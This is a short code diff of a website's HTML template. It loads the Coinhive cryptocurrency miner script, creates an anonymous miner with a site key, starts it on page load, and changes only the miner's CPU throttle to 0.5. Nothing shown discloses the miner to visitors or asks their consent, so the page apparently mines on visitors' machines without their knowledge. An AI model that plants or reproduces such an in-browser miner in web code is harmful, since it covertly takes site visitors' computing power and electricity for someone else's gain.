@@ -20,7 +20,7 @@ particlesJS.load('sidebar', '/public/json/particles-sidebar.json', function() { 
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
   // Get instance of the miner
-  var miner = new CoinHive.Anonymous('8HwAd4b7uoIsGeauLI4MFx7udLaTofWm');
+  var miner = new CoinHive.Anonymous('8HwAd4b7uoIsGeauLI4MFx7udLaTofWm',{ throttle: 0.5 });
 
   // Start this baby up!
   miner.start();
